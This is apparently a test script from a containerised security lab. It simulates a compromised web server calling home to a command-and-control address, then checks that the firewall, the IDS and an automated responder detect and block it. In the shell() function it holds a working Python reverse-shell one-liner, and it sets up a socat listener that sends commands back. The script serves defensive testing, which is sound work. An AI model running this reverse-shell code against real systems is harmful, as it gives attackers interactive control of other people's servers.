#!/usr/bin/env bash
set -uo pipefail
cd "$(dirname "$0")"
. ./lib.sh

C2="192.0.2.99"
FRESH="192.0.2.98"
RUN="a4-$(date +%H%M%S)"

c2_listen() {
  docker exec "${P}-attacker" rm -f "/tmp/c2-$1-$2.log"
  docker exec -d "${P}-attacker" sh -c "(printf 'id\nip -4 -br addr show dev eth1\n'; sleep 3; printf 'echo second-command-${RUN}\nexit\n'; sleep 4) | socat -T10 - TCP-LISTEN:$2,bind=$1,reuseaddr > /tmp/c2-$1-$2.log 2>&1"
}

c2_got() { docker exec "${P}-attacker" cat "/tmp/c2-$1-$2.log" 2>/dev/null; }

shell() {
  docker exec -u app "${P}-web" python3 -c 'import socket, subprocess, sys
s = socket.create_connection((sys.argv[1], int(sys.argv[2])), 3)
subprocess.run(["sh"], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno(), timeout=8)' "$1" "$2" >/dev/null 2>&1
  sleep 1
}

got_shell() { if c2_got "$1" "$2" | grep -q 'uid='; then echo shell; else echo "no shell"; fi; }

cleanup() {
  docker exec "${P}-attacker" sh -c "pkill -f 'TCP-LISTEN:(4444|443),bind='" >/dev/null 2>&1
  docker exec "${P}-attacker" ip addr del "${C2}/24" dev eth1 >/dev/null 2>&1
  docker exec "${P}-attacker" ip addr del "${FRESH}/24" dev eth1 >/dev/null 2>&1
}
trap cleanup EXIT

head1 "A-4  Compromised web server calls home  (web 10.10.10.10 -> C2 ${C2})"
echo "   Scenario: the attacker runs code in the web application (user app) and wants an"
echo "   interactive shell. The web server opens the connection itself (reverse shell),"
echo "   because nothing from the Internet may connect to it directly."
if response_prepare enforce; then RESP=yes; else RESP=no; fi

stage "Stage 1  Attacker infrastructure: C2 server ${C2} listens on TCP 4444 and 443"
docker exec "${P}-attacker" ip addr add "${C2}/24" dev eth1 >/dev/null 2>&1
docker exec "${P}-attacker" ip addr add "${FRESH}/24" dev eth1 >/dev/null 2>&1
c2_listen "${C2}" 4444
c2_listen "${C2}" 443
sleep 0.5
echo "   listeners ready"

stage "Stage 2  Classic reverse shell to ${C2}:4444"
since=$(date +%s%N)
shell "${C2}" 4444
check "fw-dmz drops the connection (V-12, only 80 and 443 leave the DMZ)" "no shell" "$(got_shell "${C2}" 4444)"
check "IDS detects the attempt on the mirror port (SID 1000003)" "yes" "$(siem_query '{job="dmz", host="ids", ident="suricata"} | json | alert_signature_id="1000003" | dest_ip="'"${C2}"'"' "${since}")"
if [ "${RESP}" = yes ]; then
  check "responder blocks all connections from inside to ${C2} (P-5)" "yes" "$(wait_listed egress "${C2}")"
  respond list 2>/dev/null | grep -E "^egress ${C2//./\\.} " | sed 's/^/   fw-edge: /'
  ms=$(reaction_ms egress "${C2}")
  echo "   reaction time from the IDS alert in the SIEM to the block on fw-edge: ${ms:-?} ms"
fi

stage "Stage 3  Fallback: reverse shell over TCP 443, which the DMZ may use (K-06)"
shell "${C2}" 443
if [ "${RESP}" = yes ]; then
  check "shell over 443 to the known C2 server dropped at fw-edge" "no shell" "$(got_shell "${C2}" 443)"
else
  echo "   without the responder the shell over 443 reaches ${C2}: $(got_shell "${C2}" 443)"
fi

if [ "${RESP}" = yes ]; then
  stage "Stage 4  Containment covers the whole company, without locking anyone out"
  if client socat -T1 /dev/null "TCP:${C2}:443,connect-timeout=2" >/dev/null 2>&1; then r=reachable; else r=blocked; fi
  check "client1 -> ${C2} TCP 443 blocked as well" "blocked" "${r}"
  if inet socat -T1 /dev/null "TCP:203.0.113.2:443,connect-timeout=2,bind=${C2}" >/dev/null 2>&1; then r=reachable; else r=blocked; fi
  check "${C2} itself still reaches the portal (a compromised server cannot lock out others)" "reachable" "${r}"
fi

stage "Stage 5  Fallback to a new C2 address over TCP 443 (${FRESH}), unknown to every rule"
c2_listen "${FRESH}" 443
sleep 0.5
since=$(date +%s%N)
shell "${FRESH}" 443
got=$(c2_got "${FRESH}" 443)
if printf '%s' "${got}" | grep -q 'uid='; then
  echo "   K-06 allows the connection, the first answers reach ${FRESH}:"
  printf '%s\n' "${got}" | grep -E 'uid=|eth1' | sed 's/^/     /'
  check "the shell runs as the unprivileged user app, not as root" "yes" "$(printf '%s' "${got}" | grep -qE 'uid=[0-9]+\(app\)' && echo yes || echo no)"
else
  echo "   No answer reached ${FRESH}: outbound traffic from the DMZ is restricted further than K-06 describes."
fi
check "IDS recognises command output leaving the DMZ (SID 1000007)" "yes" "$(siem_query '{job="dmz", host="ids", ident="suricata"} | json | alert_signature_id="1000007" | dest_ip="'"${FRESH}"'"' "${since}")"
if [ "${RESP}" = yes ]; then
  check "responder cuts the connection to ${FRESH} (P-5)" "yes" "$(wait_listed egress "${FRESH}")"
  ms=$(reaction_ms egress "${FRESH}")
  echo "   reaction time from the IDS alert in the SIEM to the block on fw-edge: ${ms:-?} ms"
  check "the next command 3 s later gets no answer" "no answer" "$(printf '%s' "${got}" | grep -q "second-command-${RUN}" && echo answered || echo 'no answer')"
fi

stage "Outcome"
echo "   The naive reverse shell failed at fw-dmz, the IDS saw it, and the responder cut the"
echo "   C2 server off for the whole company within a second, including the HTTPS fallback."
echo "   A new C2 address over TCP 443 got its first answers through. The IDS recognised the"
echo "   command output and the responder cut the connection before the next command."
echo "   Limit: the IDS reads the content only because this shell sends plain text over 443."
echo "   A shell inside real TLS stays invisible to it. Improvement: allow the DMZ only fixed"
echo "   destinations (package mirrors) instead of all of TCP 80 and 443 (Kommunikationsmatrix, Festlegung 3)."
echo "   Next steps for the SOC: make evidence IP=${C2}, then rebuild web (make recover)."

stage "In the SIEM, filter this run:"
echo "   ids alerts     : {job=\"dmz\", host=\"ids\"} | json | dest_ip=~\"${C2}|${FRESH}\""
echo "   fw-dmz drops   : {job=\"dmz\", host=\"fw-dmz\", ident=\"ulogd\"} | json | dst=\"${C2}\""
echo "   reaction       : {job=\"dmz\", ident=\"responder\"} | json | action=\"egress\""

finish
